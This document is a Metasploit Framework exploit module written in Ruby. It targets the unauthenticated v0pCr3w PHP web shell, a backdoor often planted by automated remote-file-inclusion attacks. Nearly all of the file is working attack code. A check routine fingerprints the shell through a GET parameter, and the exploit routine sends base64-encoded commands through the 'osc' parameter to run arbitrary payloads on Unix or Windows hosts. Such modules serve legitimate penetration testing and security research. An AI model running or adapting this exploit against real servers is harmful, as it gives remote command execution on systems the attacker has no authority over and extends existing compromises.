# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;v0pCr3w Web Shell Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a lack of authentication in the shell developed by v0pCr3w
        and is widely reused in automated RFI payloads. This module takes advantage of the
        shell&#039;s various methods to execute commands.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;bwall <bwall[at]openbwall.com>&#039;,  # vuln discovery & msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://defense.ballastsecurity.net/wiki/index.php/V0pCr3w_shell&#039;],
          [&#039;URL&#039;, &#039;https://defense.ballastsecurity.net/decoding/index.php?hash=f6b534edf37c3cc0aa88997810daf9c0&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 2000,
          &#039;BadChars&#039; => &#039;&#039;,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;
            }
        },
      &#039;Platform&#039;       => [&#039;unix&#039;, &#039;win&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;v0pCr3w / Unix&#039;, { &#039;Platform&#039; => &#039;unix&#039; } ],
          [&#039;v0pCr3w / Windows&#039;, { &#039;Platform&#039; => &#039;win&#039; } ]
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 23 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, "The path to the v0pCr3w shell", "/jos.php"]),
      ],self.class)
  end

  def check
    shell = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path.to_s),
      &#039;vars_get&#039; => {
        &#039;lol&#039; => &#039;1&#039;
      }
    })
    if (shell and shell.body =~ /v0pCr3w\<br\>/ and shell.body =~ /\<br\>nob0dyCr3w/)
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def http_send_command(cmd)
    p = Rex::Text.encode_base64(cmd)
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path.to_s),
      &#039;vars_get&#039; => {
        &#039;osc&#039; => p
      }
    })
    if not (res and res.code == 200)
      fail_with(Exploit::Failure::Unknown, &#039;Failed to execute the command.&#039;)
    end
  end

  def exploit
    http_send_command(payload.encoded)
  end
end

